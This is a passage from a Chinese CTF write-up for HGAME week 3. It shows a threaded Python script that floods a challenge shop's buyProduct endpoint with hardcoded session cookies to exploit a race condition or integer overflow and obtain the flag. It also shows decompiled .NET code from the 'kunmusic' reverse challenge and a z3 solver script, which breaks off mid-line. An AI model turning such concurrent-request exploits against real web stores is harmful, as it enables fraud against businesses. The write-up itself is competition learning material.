class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://week-3.hgame.lwsec.cn:30875/api/v1/user/buyProduct?product=Flag&amp;number=1&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;SESSION=MTY3NDQ5MTUzNHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXz3P-nsnRLwqBHiy3dxz3pgu8nGGORBOuHQaWl7ObqsvQ==; session=MTY3NDc0MzkzM3xEdi1CQkFFQ180SUFBUkFCRUFBQUpmLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dGQUFOaFlXRT18psiHGgZdURTbYwyW0lTiIA-D7mS0kxe9mu-kLSib2NI=&#x27;</span>&#125;</span><br><span class="line">    r = requests.get(url=url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    threading.Thread(target=req).start()</span><br></pre></td></tr></table></figure><p>最后点击checkflag得到flag：<code>hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</code>。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="kunmusic"><a href="#kunmusic" class="headerlink" title="kunmusic"></a>kunmusic</h3><blockquote><p>小黑子，露出鸡脚了吧？</p></blockquote><p>kmusic.dll为.NET程序，ILSpy打开，在 <code>Program</code> 类找到类似SMC反调试的异或操作：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> kmusic;</span><br><span class="line"><span class="keyword">using</span> kmusic.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Form1 form1 = <span class="keyword">new</span> Form1();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">ApplicationConfiguration.Initialize();</span><br><span class="line"><span class="built_in">byte</span>[] data = Resources.data;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; data.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">data[i] ^= <span class="number">104</span>;</span><br><span class="line">&#125;</span><br><span class="line">Activator.CreateInstance(Assembly.Load(data).GetType(<span class="string">&quot;WinFormsLibrary1.Class1&quot;</span>), form1);</span><br><span class="line">Application.Run((Form)(<span class="built_in">object</span>)form1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在资源部分找到 <code>Resources.data</code>，导出，异或104还原出另一个.NET程序，在 <code>Class1</code> 类中找到关键逻辑：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Media;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> kmusic;</span><br><span class="line"><span class="keyword">using</span> kmusic.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Class1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span>[] num = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">13</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">music</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//IL_0ade: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0ae9: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="keyword">if</span> (num[<span class="number">0</span>] + <span class="number">52296</span> + num[<span class="number">1</span>] - <span class="number">26211</span> + num[<span class="number">2</span>] - <span class="number">11754</span> + (num[<span class="number">3</span>] ^ <span class="number">0xA114</span>) + num[<span class="number">4</span>] * <span class="number">63747</span> + num[<span class="number">5</span>] - <span class="number">52714</span> + num[<span class="number">6</span>] - <span class="number">10512</span> + num[<span class="number">7</span>] * <span class="number">12972</span> + num[<span class="number">8</span>] + <span class="number">45505</span> + num[<span class="number">9</span>] - <span class="number">21713</span> + num[<span class="number">10</span>] - <span class="number">59122</span> + num[<span class="number">11</span>] - <span class="number">12840</span> + (num[<span class="number">12</span>] ^ <span class="number">0x525F</span>) == <span class="number">12702282</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">25228</span> + (num[<span class="number">1</span>] ^ <span class="number">0x50DB</span>) + (num[<span class="number">2</span>] ^ <span class="number">0x1FDE</span>) + num[<span class="number">3</span>] - <span class="number">65307</span> + num[<span class="number">4</span>] * <span class="number">30701</span> + num[<span class="number">5</span>] * <span class="number">47555</span> + num[<span class="number">6</span>] - <span class="number">2557</span> + (num[<span class="number">7</span>] ^ <span class="number">0xBF9F</span>) + num[<span class="number">8</span>] - <span class="number">7992</span> + (num[<span class="number">9</span>] ^ <span class="number">0xE079</span>) + (num[<span class="number">10</span>] ^ <span class="number">0xE052</span>) + num[<span class="number">11</span>] + <span class="number">13299</span> + num[<span class="number">12</span>] - <span class="number">50966</span> == <span class="number">9946829</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">64801</span> + num[<span class="number">1</span>] - <span class="number">60698</span> + num[<span class="number">2</span>] - <span class="number">40853</span> + num[<span class="number">3</span>] - <span class="number">54907</span> + num[<span class="number">4</span>] + <span class="number">29882</span> + (num[<span class="number">5</span>] ^ <span class="number">0x3506</span>) + (num[<span class="number">6</span>] ^ <span class="number">0x533E</span>) + num[<span class="number">7</span>] + <span class="number">47366</span> + num[<span class="number">8</span>] + <span class="number">41784</span> + (num[<span class="number">9</span>] ^ <span class="number">0xD1BA</span>) + num[<span class="number">10</span>] * <span class="number">58436</span> + num[<span class="number">11</span>] * <span class="number">15590</span> + num[<span class="number">12</span>] + <span class="number">58225</span> == <span class="number">2372055</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">61538</span> + num[<span class="number">1</span>] - <span class="number">17121</span> + num[<span class="number">2</span>] - <span class="number">58124</span> + num[<span class="number">3</span>] + <span class="number">8186</span> + num[<span class="number">4</span>] + <span class="number">21253</span> + num[<span class="number">5</span>] - <span class="number">38524</span> + num[<span class="number">6</span>] - <span class="number">48323</span> + num[<span class="number">7</span>] - <span class="number">20556</span> + num[<span class="number">8</span>] * <span class="number">56056</span> + num[<span class="number">9</span>] + <span class="number">18568</span> + num[<span class="number">10</span>] + <span class="number">12995</span> + (num[<span class="number">11</span>] ^ <span class="number">0x995C</span>) + num[<span class="number">12</span>] + <span class="number">25329</span> == <span class="number">6732474</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">42567</span> + num[<span class="number">1</span>] - <span class="number">17743</span> + num[<span class="number">2</span>] * <span class="number">47827</span> + num[<span class="number">3</span>] - <span class="number">10246</span> + (num[<span class="number">4</span>] ^ <span class="number">0x3F9C</span>) + num[<span class="number">5</span>] + <span class="number">39390</span> + num[<span class="number">6</span>] * <span class="number">11803</span> + num[<span class="number">7</span>] * <span class="number">60332</span> + (num[<span class="number">8</span>] ^ <span class="number">0x483B</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x12BB</span>) + num[<span class="number">10</span>] - <span class="number">25636</span> + num[<span class="number">11</span>] - <span class="number">16780</span> + num[<span class="number">12</span>] - <span class="number">62345</span> == <span class="number">14020739</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">10968</span> + num[<span class="number">1</span>] - <span class="number">31780</span> + (num[<span class="number">2</span>] ^ <span class="number">0x7C71</span>) + num[<span class="number">3</span>] - <span class="number">61983</span> + num[<span class="number">4</span>] * <span class="number">31048</span> + num[<span class="number">5</span>] * <span class="number">20189</span> + num[<span class="number">6</span>] + <span class="number">12337</span> + num[<span class="number">7</span>] * <span class="number">25945</span> + (num[<span class="number">8</span>] ^ <span class="number">0x1B98</span>) + num[<span class="number">9</span>] - <span class="number">25369</span> + num[<span class="number">10</span>] - <span class="number">54893</span> + num[<span class="number">11</span>] * <span class="number">59949</span> + (num[<span class="number">12</span>] ^ <span class="number">0x3099</span>) == <span class="number">14434062</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">16689</span> + num[<span class="number">1</span>] - <span class="number">10279</span> + num[<span class="number">2</span>] - <span class="number">32918</span> + num[<span class="number">3</span>] - <span class="number">57155</span> + num[<span class="number">4</span>] * <span class="number">26571</span> + num[<span class="number">5</span>] * <span class="number">15086</span> + (num[<span class="number">6</span>] ^ <span class="number">0x59CA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0x5B35</span>) + (num[<span class="number">8</span>] ^ <span class="number">0x3FFD</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x5A85</span>) + num[<span class="number">10</span>] - <span class="number">40224</span> + num[<span class="number">11</span>] + <span class="number">31751</span> + num[<span class="number">12</span>] * <span class="number">8421</span> == <span class="number">7433598</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">28740</span> + num[<span class="number">1</span>] - <span class="number">64696</span> + num[<span class="number">2</span>] + <span class="number">60470</span> + num[<span class="number">3</span>] - <span class="number">14752</span> + (num[<span class="number">4</span>] ^ <span class="number">0x507</span>) + (num[<span class="number">5</span>] ^ <span class="number">0x89C8</span>) + num[<span class="number">6</span>] + <span class="number">49467</span> + num[<span class="number">7</span>] - <span class="number">33788</span> + num[<span class="number">8</span>] + <span class="number">20606</span> + (num[<span class="number">9</span>] ^ <span class="number">0xAF4A</span>) + num[<span class="number">10</span>] * <span class="number">19764</span> + num[<span class="number">11</span>] + <span class="number">48342</span> + num[<span class="number">12</span>] * <span class="number">56511</span> == <span class="number">7989404</span> &amp;&amp; (num[<span class="number">0</span>] ^ <span class="number">0x7132</span>) + num[<span class="number">1</span>] + <span class="number">23120</span> + num[<span class="number">2</span>] + <span class="number">22802</span> + num[<span class="number">3</span>] * <span class="number">31533</span> + (num[<span class="number">4</span>] ^ <span class="number">0x9977</span>) + num[<span class="number">5</span>] - <span class="number">48576</span> + (num[<span class="number">6</span>] ^ <span class="number">0x6F7E</span>) + num[<span class="number">7</span>] - <span class="number">43265</span> + num[<span class="number">8</span>] + <span class="number">22365</span> + num[<span class="number">9</span>] + <span class="number">61108</span> + num[<span class="number">10</span>] * <span class="number">2823</span> + num[<span class="number">11</span>] - <span class="number">30343</span> + num[<span class="number">12</span>] + <span class="number">14780</span> == <span class="number">3504803</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">22466</span> + (num[<span class="number">1</span>] ^ <span class="number">0xDABF</span>) + num[<span class="number">2</span>] - <span class="number">53658</span> + (num[<span class="number">3</span>] ^ <span class="number">0xB838</span>) + (num[<span class="number">4</span>] ^ <span class="number">0x30DF</span>) + num[<span class="number">5</span>] * <span class="number">59807</span> + num[<span class="number">6</span>] + <span class="number">46242</span> + num[<span class="number">7</span>] + <span class="number">3052</span> + (num[<span class="number">8</span>] ^ <span class="number">0x62BF</span>) + num[<span class="number">9</span>] + <span class="number">30202</span> + num[<span class="number">10</span>] * <span class="number">22698</span> + num[<span class="number">11</span>] + <span class="number">33480</span> + (num[<span class="number">12</span>] ^ <span class="number">0x4175</span>) == <span class="number">11003580</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">57492</span> + (num[<span class="number">1</span>] ^ <span class="number">0x346D</span>) + num[<span class="number">2</span>] - <span class="number">13941</span> + (num[<span class="number">3</span>] ^ <span class="number">0xBBDC</span>) + num[<span class="number">4</span>] * <span class="number">38310</span> + num[<span class="number">5</span>] + <span class="number">9884</span> + num[<span class="number">6</span>] - <span class="number">45500</span> + num[<span class="number">7</span>] - <span class="number">19233</span> + num[<span class="number">8</span>] + <span class="number">58274</span> + num[<span class="number">9</span>] + <span class="number">36175</span> + (num[<span class="number">10</span>] ^ <span class="number">0x4888</span>) + num[<span class="number">11</span>] * <span class="number">49694</span> + (num[<span class="number">12</span>] ^ <span class="number">0x2501</span>) == <span class="number">25546210</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">23355</span> + num[<span class="number">1</span>] * <span class="number">50164</span> + (num[<span class="number">2</span>] ^ <span class="number">0x873A</span>) + num[<span class="number">3</span>] + <span class="number">52703</span> + num[<span class="number">4</span>] + <span class="number">36245</span> + num[<span class="number">5</span>] * <span class="number">46648</span> + (num[<span class="number">6</span>] ^ <span class="number">0x12FA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0xA376</span>) + num[<span class="number">8</span>] * <span class="number">27122</span> + (num[<span class="number">9</span>] ^ <span class="number">0xA44A</span>) + num[<span class="number">10</span>] * <span class="number">15676</span> + num[<span class="number">11</span>] - <span class="number">31863</span> + num[<span class="number">12</span>] + <span class="number">62510</span> == <span class="number">11333836</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">30523</span> + (num[<span class="number">1</span>] ^ <span class="number">0x1F36</span>) + num[<span class="number">2</span>] + <span class="number">39058</span> + num[<span class="number">3</span>] * <span class="number">57549</span> + (num[<span class="number">4</span>] ^ <span class="number">0xD0C0</span>) + num[<span class="number">5</span>] * <span class="number">4275</span> + num[<span class="number">6</span>] - <span class="number">48863</span> + (num[<span class="number">7</span>] ^ <span class="number">0xD88C</span>) + (num[<span class="number">8</span>] ^ <span class="number">0xA40</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x3554</span>) + num[<span class="number">10</span>] + <span class="number">62231</span> + num[<span class="number">11</span>] + <span class="number">19456</span> + num[<span class="number">12</span>] - <span class="number">13195</span> == <span class="number">13863722</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span>[] array = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">47</span>]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">132</span>, <span class="number">47</span>, <span class="number">180</span>, <span class="number">7</span>, <span class="number">216</span>, <span class="number">45</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">39</span>, <span class="number">246</span>,</span><br><span class="line"><span class="number">124</span>, <span class="number">2</span>, <span class="number">243</span>, <span class="number">137</span>, <span class="number">58</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">200</span>, <span class="number">99</span>, <span class="number">91</span>,</span><br><span class="line"><span class="number">83</span>, <span class="number">13</span>, <span class="number">171</span>, <span class="number">80</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">179</span>, <span class="number">58</span>, <span class="number">176</span>, <span class="number">28</span>,</span><br><span class="line"><span class="number">216</span>, <span class="number">36</span>, <span class="number">11</span>, <span class="number">80</span>, <span class="number">39</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">58</span>, <span class="number">236</span>, <span class="number">130</span>,</span><br><span class="line"><span class="number">123</span>, <span class="number">176</span>, <span class="number">24</span>, <span class="number">212</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">72</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; array.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">text += (<span class="built_in">char</span>)(array[i] ^ num[i % num.Length]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> SoundPlayer((Stream)Resources.过年鸡).Play();</span><br><span class="line">MessageBox.Show(text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取判断条件，用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">132</span>, <span class="number">47</span>, <span class="number">180</span>, <span class="number">7</span>, <span class="number">216</span>, <span class="number">45</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">39</span>, <span class="number">246</span>, <span class="number">124</span>, <span class="number">2</span>, <span class="number">243</span>, <span class="number">137</span>, <span class="number">58</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">200</span>, <span class="number">99</span>, <span class="number">91</span>, <span class="number">83</span>, <span class="number">13</span>, <span class="number">171</span>, <span class="number">80</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">179</span>, <span class="number">58</span>, <span class="number">176</span>, <span class="number">28</span>, <span class="number">216</span>, <span class="number">36</span>, <span class="number">11</span>, <span class="number">80</span>, <span class="number">39</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">58</span>, <span class="number">236</span>, <span class="number">130</span>, <span class="number">123</span>, <span class="number">176</span>, <span class="number">24</span>, <span class="number">212</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">72</span>]</span><br><span class="line"></span><br><span class="line">num = [BitVec(<span class="string">f&#x27;num<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(num[<span class="number">0</span>] + <span class="number">52296</span> + num[<span class="number">1</span>] - <span class="number">26211</span> + num[<span class="number">2</span>] - <span class="number">11754</span> + (num[<span class="number">3</span>] ^ <span class="number">0xA114</span>) + num[<span class="number">4</span>] * <span class="number">63747</span> + num[<span class="number">5</span>] - <span class="number">52714</span> + num[<span class="number">6</span>] - <span class="number">10512</span> + num[<span class="number">7</span>] * <span class="number">12972</span> + num[<span class="number">8</span>] + <span class="number">45505</span> + num[<span class="number">9</span>] - <span class="number">21713</span> + num[<span class="number">10</span>] - <span class="number">59122</span> + num[<span class="number">11</span>] - <span class="number">12840</span> + (num[<span class="number">12</span>] ^ <span class="number">0x525F</span>) == <span class="number">12702282</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">25228</span> + (num[<span class="number">1</span>] ^ <span class="number">0x50DB</span>) + (num[<span class="number">2</span>] ^ <span class="number">0x1FDE</span>) + num[<span class="number">3</span>] - <span class="number">65307</span> + num[<span class="number">4</span>] * <span class="number">30701</span> + num[<span class="number">5</span>] * <span class="number">47555</span> + num[<span class="number">6</span>] - <span class="number">2557</span> + (num[<span class="number">7</span>] ^ <span class="number">0xBF9F</span>) + num[<span class="number">8</span>] - <span class="number">7992</span> + (num[<span class="number">9</span>] ^ <span class="number">0xE079</span>) + (num[<span class="number">10</span>] ^ <span class="number">0xE052</span>) + num[<span class="number">11</span>] + <span class="number">13299</span> + num[<span class="number">12</span>] - <span class="number">50966</span> == <span class="number">9946829</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">64801</span> + num[<span class="number">1</span>] - <span class="number">60698</span> + num[<span class="number">2</span>] - <span class="number">40853</span> + num[<span class="number">3</span>] - <span class="number">54907</span> + num[<span class="number">4</span>] + <span class="number">29882</span> + (num[<span class="number">5</span>] ^ <span class="number">0x3506</span>) + (num[<span class="number">6</span>] ^ <span class="number">0x533E</span>) + num[<span class="number">7</span>] + <span class="number">47366</span> + num[<span class="number">8</span>] + <span class="number">41784</span> + (num[<span class="number">9</span>] ^ <span class="number">0xD1BA</span>) + num[<span class="number">10</span>] * <span class="number">58436</span> + num[<span class="number">11</span>] * <span class="number">15590</span> + num[<span class="number">12</span>] + <span class="number">58225</span> == <span class="number">2372055</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">61538</span> + num[<span class="number">1</span>] - <span class="number">17121</span> + num[<span class="number">2</span>] - <span class="number">58124</span> + num[<span class="number">3</span>] + <span class="number">8186</span> + num[<span class="number">4</span>] + <span class="number">21253</span> + num[<span class="number">5</span>] - <span class="number">38524</span> + num[<span class="number">6</span>] - <span class="number">48323</span> + num[<span class="number">7</span>] - <span class="number">20556</span> + num[<span class="number">8</span>] * <span class="number">56056</span> + num[<span class="number">9</span>] + <span class="number">18568</span> + num[<span class="number">10</span>] + <span class="number">12995</span> + (num[<span class="number">11</span>] ^ <span class="number">0x995C</span>) + num[<span class="number">12</span>] + <span class="number">25329</span> == <span class="number">6732474</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">42567</span> + num[<span class="number">1</span>] - <span class="number">17743</span> + num[<span class="number">2</span>] * <span class="number">47827</span> + num[<span class="number">3</span>] - <span class="number">10246</span> + (num[<span class="number">4</span>] ^ <span class="number">0x3F9C</span>) + num[<span class="number">5</span>] + <span class="number">39390</span> + num[<span class="number">6</span>] * <span class="number">11803</span> + num[<span class="number">7</span>] * <span class="number">60332</span> + (num[<span class="number">8</span>] ^ <span class="number">0x483B</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x12BB</span>) + num[<span class="number">10</span>] - <span class="number">25636</span> + num[<span class="number">11</span>] - <span class="number">16780</span> + num[<span class="number">12</span>] - <span class="number">62345</span> == <span class="number">14020739</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">10968</span> + num[<span class="number">1</span>] - <span class="number">31780</span> + (num[<span class="number">2</span>] ^ <span class="number">0x7C71</span>) + num[<span class="number">3</span>] - <span class="number">61983</span> + num[<span class="number">4</span>] * <span class="number">31048</span> + num[<span class="number">5</span>] * <span class="number">20189</span> + num[<span class="number">6</span>] + <span class="number">12337</span> + num[<span class="number">7</span>] * <span class="number">25945</span> + (num[<span class="number">8</span>] ^ <span class="number">0x1B98</span>) + num[<span class="number">9</span>] - <span class="number">25369</span> + num[<span class="number">10</span>] - <span class="number">54893</span> + num[<span class="number">11</span>] * <span class="number">59949</span> + (num[<span class="number">12</span>] ^ <span class="number">0x3099</span>) == <span class="number">14434062</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">16689</span> + num[<span class="number">1</span>] - <span class="number">10279</span> + num[<span class="number">2</span>] - <span class="number">32918</span> + num[<span class="number">3</span>] - <span class="number">57155</span> + num[<span class="number">4</span>] * <span class="number">26571</span> + num[<span class="number">5</span>] * <span class="number">15086</span> + (num[<span class="number">6</span>] ^ <span class="number">0x59CA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0x5B35</span>) + (num[<span class="number">8</span>] ^ <span class="number">0x3FFD</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x5A85</span>) + num[<span class="number">10</span>] - <span class="number">40224</span> + num[<span class="number">11</span>] + <span class="number">31751</span> + num[<span class="number">12</span>] * <span class="number">8421</span> == <span class="number">7433598</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] + <span class="number">28740</span> + num[<span class="number">1</span>] - <span class="number">64696</span> + num[<span class="number">2</span>] + <span class="number">60470</span> + num[<span class="number">3</span>] - <span class="number">14752</span> + (num[<span class="number">4</span>] ^ <span class="number">0x507</span>) + (num[<span class="number">5</span>] ^ <span class="number">0x89C8</span>) + num[<span class="number">6</span>] + <span class="number">49467</span> + num[<span class="number">7</span>] - <span class="number">33788</span> + num[<span class="number">8</span>] + <span class="number">20606</span> + (num[<span class="number">9</span>] ^ <span class="number">0xAF4A</span>) + num[<span class="number">10</span>] * <span class="number">19764</span> + num[<span class="number">11</span>] + <span class="number">48342</span> + num[<span class="number">12</span>] * <span class="number">56511</span> == <span class="number">7989404</span> )</span><br><span class="line">s.add( (num[<span class="number">0</span>] ^ <span class="number">0x7132</span>) + num[<span class="number">1</span>] + <span class="number">23120</span> + num[<span class="number">2</span>] + <span class="number">22802</span> + num[<span class="number">3</span>] * <span class="number">31533</span> + (num[<span class="number">4</span>] ^ <span class="number">0x9977</span>) + num[<span class="number">5</span>] - <span class="number">48576</span> + (num[<span class="number">6</span>] ^ <span class="number">0x6F7E</span>) + num[<span class="number">7</span>] - <span class="number">43265</span> + num[<span class="number">8</span>] + <span class="number">22365</span> + num[<span class="number">9</span>] + <span class="number">61108</span> + num[<span class="number">10</span>] * <span class="number">2823</span> + num[<span class="number">11</span>] - <span class="number">30343</span> + num[<span class="number">12</span>] + <span class="number">14780</span> == <span class="number">3504803</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">22466</span> + (num[<span class="number">1</span>] ^ <span class="number">0xDABF</span>) + num[<span class="number">2</span>] - <span class="number">53658</span> + (num[<span class="number">3</span>] ^ <span class="number">0xB838</span>) + (num[<span class="number">4</span>] ^ <span class="number">0x30DF</span>) + num[<span class="number">5</span>] * <span class="number">59807</span> + num[<span class="number">6</span>] + <span class="number">46242</span> + num[<span class="number">7</span>] + <span class="number">3052</span> + (num[<span class="number">8</span>] ^ <span class="number">0x62BF</span>) + num[<span class="number">9</span>] + <span class="number">30202</span> + num[<span class="number">10</span>] * <span class="number">22698</span> + num[<span class="number">11</span>] + <span class="number">33480</span> + (num[<span class="number">12</span>] ^ <span class="number">0x4175</span>) == <span class="number">11003580</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">57492</span> + (num[<span class="number">1</span>] ^ <span class="number">0x346D</span>) + num[<span class="number">2</span>] - <span class="number">13941</span> + (num[<span class="number">3</span>] ^ <span class="number">0xBBDC</span>) + num[<span class="number">4</span>] * <span class="number">38310</span> + num[<span class="number">5</span>] + <span class="number">9884</span> + num[<span class="number">6</span>] - <span class="number">45500</span> + num[<span class="number">7</span>] - <span class="number">19233</span> + num[<span class="number">8</span>] + <span class="number">58274</span> + num[<span class="number">9</span>] + <span class="number">36175</span> + (num[<span class="number">10</span>] ^ <span class="number">0x4888</span>) + num[<span class="number">11</span>] * <span class="number">49694</span> + (num[<span class="number">12</span>] ^ <span class="number">0x2501</span>) == <span class="number">25546210</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] - <span class="number">23355</span> + num[<span class="number">1</span>] * <span class="number">50164</span> + (num[<span class="number">2</span>] ^ <span class="number">0x873A</span>) + num[<span class="number">3</span>] + <span class="number">52703</span> + num[<span class="number">4</span>] + <span class="number">36245</span> + num[<span class="number">5</span>] * <span class="number">46648</span> + (num[<span class="number">6</span>] ^ <span class="number">0x12FA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0xA376</span>) + num[<span class="number">8</span>] * <span class="number">27122</span> + (num[<span class="number">9</span>] ^ <span class="number">0xA44A</span>) + num[<span class="number">10</span>] * <span class="number">15676</span> + num[<span class="number">11</span>] - <span class="number">31863</span> + num[<span class="number">12</span>] + <span class="number">62510</span> == <span class="number">11333836</span> )</span><br><span class="line">s.add( num[<span class="number">0</span>] * <span class="number">30523</span> + (num[<span class="number">1</span>] ^ <span 